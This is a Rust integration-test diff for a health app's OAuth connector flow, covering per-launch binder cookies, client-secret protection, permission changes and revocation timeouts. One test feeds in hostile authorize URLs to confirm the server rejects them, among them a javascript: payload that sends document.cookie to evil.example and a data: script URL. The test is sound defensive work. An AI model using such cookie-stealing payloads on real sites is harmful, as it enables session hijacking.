@@ -15,7 +15,7 @@ use std::sync::{Arc, Mutex};
 use axum::Extension;
 use axum::http::StatusCode;
 use connector_fake::{CLIENT_ID, CLIENT_SECRET, Fake, REDIRECT, param};
-use ownhealth_api::routes::connectors::{BINDER_COOKIE, EgressOverride};
+use ownhealth_api::routes::connectors::{EgressOverride, binder_cookie_name};
 use ownhealth_core::Runtime;
 use ownhealth_core::demo::create_rivera_family;
 use ownhealth_core::net::Egress;
@@ -157,16 +157,17 @@ async fn a_person_connects_and_sees_the_connection_and_no_answer_carries_a_token
     let mut c = t.browser("alex").await?;
     let r = t.launch(&mut c, t.env.profile("alex")).await?;
     assert_eq!(r.status, StatusCode::OK, "{}", r.json);
+    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
+    let binder = binder_cookie_name(&param(&url, "state").unwrap_or_default());
     let cookie = r
         .set_cookies()
         .into_iter()
-        .find(|s| s.starts_with(&format!("{BINDER_COOKIE}=")))
+        .find(|s| s.starts_with(&format!("{binder}=")))
         .unwrap_or_default();
     assert!(
         cookie.contains("HttpOnly") && cookie.contains("Path=/api/connectors") && cookie.contains("Secure"),
         "{cookie}"
     );
-    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
     assert!(url.starts_with(&format!("{}/authorize?", t.fake.base)), "{url}");
     let back = t.callback(&mut c, &url).await?;
     assert_eq!(back.status, StatusCode::FOUND);
@@ -179,7 +180,7 @@ async fn a_person_connects_and_sees_the_connection_and_no_answer_carries_a_token
     assert!(
         back.set_cookies()
             .iter()
-            .any(|s| s.starts_with(BINDER_COOKIE) && s.contains("Max-Age=0")),
+            .any(|s| s.starts_with(&format!("{binder}=")) && s.contains("Max-Age=0")),
         "{:?}",
         back.set_cookies()
     );
@@ -238,24 +239,27 @@ async fn a_callback_counts_only_in_the_browser_and_the_session_that_started_it()
     let r = t.launch(&mut a, alex).await?;
     let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
     let mut sam = t.browser("sam").await?;
-    let binder = a.cookies.get(BINDER_COOKIE).cloned().unwrap_or_default();
-    sam.cookies.insert(BINDER_COOKIE.into(), binder.clone());
+    let name = binder_cookie_name(&param(&url, "state").unwrap_or_default());
+    let binder = a.cookies.get(&name).cloned().unwrap_or_default();
+    sam.cookies.insert(name, binder);
     assert_eq!(error_of(&t.callback(&mut sam, &url).await?), "wrong_user");
 
     // the same person, another session, with the binder
     let r = t.launch(&mut a, alex).await?;
     let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
     let mut later = t.browser("alex").await?;
-    let binder = a.cookies.get(BINDER_COOKIE).cloned().unwrap_or_default();
-    later.cookies.insert(BINDER_COOKIE.into(), binder);
+    let name = binder_cookie_name(&param(&url, "state").unwrap_or_default());
+    let binder = a.cookies.get(&name).cloned().unwrap_or_default();
+    later.cookies.insert(name, binder);
     assert_eq!(error_of(&t.callback(&mut later, &url).await?), "wrong_user");
 
     // logged out
     let r = t.launch(&mut a, alex).await?;
     let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
     let mut anon = widen(t.env.anon());
-    let binder = a.cookies.get(BINDER_COOKIE).cloned().unwrap_or_default();
-    anon.cookies.insert(BINDER_COOKIE.into(), binder);
+    let name = binder_cookie_name(&param(&url, "state").unwrap_or_default());
+    let binder = a.cookies.get(&name).cloned().unwrap_or_default();
+    anon.cookies.insert(name, binder);
     assert_eq!(error_of(&t.callback(&mut anon, &url).await?), "wrong_user");
 
     // the person refused at the vendor: the state goes too
@@ -308,7 +312,10 @@ async fn a_callback_counts_only_in_the_browser_and_the_session_that_started_it()
         "{}",
         ok.location()
     );
-    assert!(!a.cookies.contains_key(BINDER_COOKIE), "the binder outlived its launch");
+    assert!(
+        !a.cookies.contains_key(&binder_cookie_name(&state)),
+        "the binder outlived its launch"
+    );
     let replay = a
         .get(&format!("/api/connectors/callback?state={state}&code={code}"))
         .await?;
@@ -538,6 +545,228 @@ async fn a_profile_delete_revokes_at_each_vendor_first_and_shows_a_failed_revoca
             ("revocation=revoked".to_string(), "ok".to_string()),
             ("revocation=failed".to_string(), "error".to_string())
         ]
+    );
+    Ok(())
+}
+
+#[tokio::test]
+async fn two_launches_in_one_browser_both_complete_and_a_stray_callback_breaks_neither() -> R {
+    let t = setup().await?;
+    let mut a = t.browser("alex").await?;
+    let (alex, lucia) = (t.env.profile("alex"), t.env.profile("lucia"));
+    let url_of = |r: &Resp| r.json["authorize_url"].as_str().unwrap_or_default().to_string();
+    // a guardian connects two family members in two tabs
+    let first = t.launch(&mut a, alex).await?;
+    let second = t.launch(&mut a, lucia).await?;
+    let (one, two) = (url_of(&first), url_of(&second));
+    // a stale bookmark, or a vendor that sends the browser back twice
+    let stray = a
+        .get("/api/connectors/callback?state=made-up-state-of-some-length&code=x")
+        .await?;
+    assert_eq!(error_of(&stray), "state_invalid");
+    let back = t.callback(&mut a, &one).await?;
+    assert!(
+        back.location().starts_with("/connections?connected="),
+        "{}",
+        back.location()
+    );
+    let back = t.callback(&mut a, &two).await?;
+    assert!(
+        back.location().starts_with("/connections?connected="),
+        "{}",
+        back.location()
+    );
+    // the other order
+    let third = url_of(&t.launch(&mut a, alex).await?);
+    let fourth = url_of(&t.launch(&mut a, lucia).await?);
+    for url in [&fourth, &third] {
+        let back = t.callback(&mut a, url).await?;
+        assert!(
+            back.location().starts_with("/connections?connected="),
+            "{}",
+            back.location()
+        );
+    }
+    assert_eq!(t.count("select count(*) from source").await?, 4);
+    // each launch has its own short-lived binder, and each goes with its launch
+    let names: Vec<String> = [&one, &two]
+        .iter()
+        .map(|u| binder_cookie_name(&param(u, "state").unwrap_or_default()))
+        .collect();
+    assert_ne!(names[0], names[1]);
+    for (r, name) in [(&first, &names[0]), (&second, &names[1])] {
+        let set = r.set_cookies().into_iter().find(|c| c.starts_with(&format!("{name}=")));
+        assert!(
+            set.as_deref()
+                .is_some_and(|c| c.contains("Max-Age=600") && c.contains("Path=/api/connectors/callback")),
+            "{:?}",
+            r.set_cookies()
+        );
+        assert!(!a.cookies.contains_key(name), "{name} outlived its launch");
+    }
+    Ok(())
+}
+
+/// A household client that has a secret: inserted as the wizard would, but with no fixed server.
+async fn confidential_without_server(env: &Env, household: Uuid) -> anyhow::Result<Uuid> {
+    let sb = SecretBox::from_settings(&env.settings)?;
+    let mut c = env.pool().acquire().await?;
+    let secret = store_secret(
+        &mut c,
+        &sb,
+        household,
+        "connector_client_secret",
+        None,
+        &SecretString::new(CLIENT_SECRET),
+    )
+    .await?;
+    Ok(sqlx::query_scalar(
+        "insert into connector_client (household_id, vendor, issuer, client_id, client_secret_id, redirect_uri) \
+         values ($1, 'epic', null, $2, $3, $4) returning id",
+    )
+    .bind(household)
+    .bind(CLIENT_ID)
+    .bind(secret)
+    .bind(REDIRECT)
+    .fetch_one(&mut *c)
+    .await?)
+}
+
+#[tokio::test]
+async fn the_schema_refuses_a_client_with_a_secret_and_no_fixed_server() -> R {
+    let t = setup().await?;
+    let h = household(&t.env, t.env.profile("sam")).await?;
+    match confidential_without_server(&t.env, h).await {
+        Err(e) => assert!(e.to_string().contains("connector_client_secret_needs_issuer"), "{e}"),
+        Ok(id) => panic!("a client with a secret and no server was stored: {id}"),
+    }
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_server_the_person_types_never_receives_the_household_client_secret() -> R {
+    let t = setup().await?;
+    let h = household(&t.env, t.env.profile("sam")).await?;
+    // a row written before the schema refused it
+    sqlx::query("alter table connector_client drop constraint if exists connector_client_secret_needs_issuer")
+        .execute(t.env.pool())
+        .await?;
+    let client = confidential_without_server(&t.env, h).await?;
+    let attacker = Fake::start().await;
+    let mut sam = t.browser("sam").await?;
+    let r = sam
+        .post(
+            "/api/connectors/launch/smart",
+            &json!({"profile_id": t.env.profile("sam"), "client_id": client, "issuer": attacker.issuer()}),
+        )
+        .await?;
+    assert_eq!(r.status, StatusCode::UNPROCESSABLE_ENTITY, "{}", r.json);
+    assert!(r.json.get("authorize_url").is_none(), "{}", r.json);
+    assert_eq!(attacker.book().requests, 0, "the typed server was reached");
+    assert_eq!(
+        t.count("select count(*) from auth_challenge where purpose = 'connector'")
+            .await?,
+        0
+    );
+    // the reverse: a public client (no secret) may serve whichever server the person names
+    let public: Uuid = sqlx::query_scalar(
+        "insert into connector_client (household_id, vendor, issuer, client_id, redirect_uri) \
+         values ($1, 'meditech', null, $2, $3) returning id",
+    )
+    .bind(h)
+    .bind(CLIENT_ID)
+    .bind(REDIRECT)
+    .fetch_one(t.env.pool())
+    .await?;
+    let r = sam
+        .post(
+            "/api/connectors/launch/smart",
+            &json!({"profile_id": t.env.profile("sam"), "client_id": public, "issuer": attacker.issuer()}),
+        )
+        .await?;
+    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_server_that_names_a_script_as_its_sign_in_page_gets_no_redirect_handed_out() -> R {
+    let t = setup().await?;
+    let mut a = t.browser("alex").await?;
+    let alex = t.env.profile("alex");
+    let id = t.connect(&mut a, alex).await?;
+    let launches = t
+        .count("select count(*) from auth_challenge where purpose = 'connector'")
+        .await?;
+    for bad in [
+        "javascript:fetch(\"https://evil.example/\"+document.cookie)//",
+        "data:text/html,<script>alert(1)</script>",
+        "http://login.evil.example/authorize",
+    ] {
+        t.fake.set(|b| b.authorize_url = Some(bad.into()));
+        for r in [
+            t.launch(&mut a, alex).await?,
+            a.post0(&format!("/api/connectors/{id}/reconnect")).await?,
+        ] {
+            assert_eq!(
+                (r.status, r.json["detail"]["code"].as_str()),
+                (StatusCode::CONFLICT, Some("bad_endpoint")),
+                "{bad}: {}",
+                r.json
+            );
+            assert!(!r.json.to_string().contains("evil.example"), "{}", r.json);
+            assert!(r.set_cookies().is_empty(), "{:?}", r.set_cookies());
+        }
+    }
+    assert_eq!(
+        t.count("select count(*) from auth_challenge where purpose = 'connector'")
+            .await?,
+        launches
+    );
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_callback_after_the_person_lost_the_right_to_manage_the_profile_saves_nothing() -> R {
+    let t = setup().await?;
+    let mut a = t.browser("alex").await?;
+    let lucia = t.env.profile("lucia");
+    let r = t.launch(&mut a, lucia).await?;
+    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
+    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
+    // between the launch and the return, Alex is made a viewer of Lucía
+    let changed = sqlx::query("update profile_grant set role = 'viewer' where user_id = $1 and profile_id = $2")
+        .bind(t.env.user("alex"))
+        .bind(lucia)
+        .execute(t.env.pool())
+        .await?
+        .rows_affected();
+    assert_eq!(changed, 1);
+    let back = t.callback(&mut a, &url).await?;
+    assert_eq!(error_of(&back), "forbidden");
+    assert_eq!(t.count("select count(*) from source").await?, 0);
+    assert!(t.fake.book().auth_seen.is_empty(), "the code went to the vendor");
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_profile_delete_waits_at_most_the_cap_for_a_slow_revocation_and_says_it_failed() -> R {
+    let t = setup().await?;
+    let mut a = t.browser("alex").await?;
+    t.connect(&mut a, t.env.profile("lucia")).await?;
+    t.fake.set(|b| b.revoke_delay_ms = 8_000);
+    let started = std::time::Instant::now();
+    let r = a.delete("/api/profiles/lucia?confirm=lucia").await?;
+    let took = started.elapsed();
+    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
+    assert_eq!(r.json["connectors"][0]["outcome"], "failed", "{}", r.json);
+    assert!(
+        took < std::time::Duration::from_millis(7_000),
+        "the delete waited {took:?}"
+    );
+    assert_eq!(
+        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
+            .await?,
+        0
     );
     Ok(())
 }
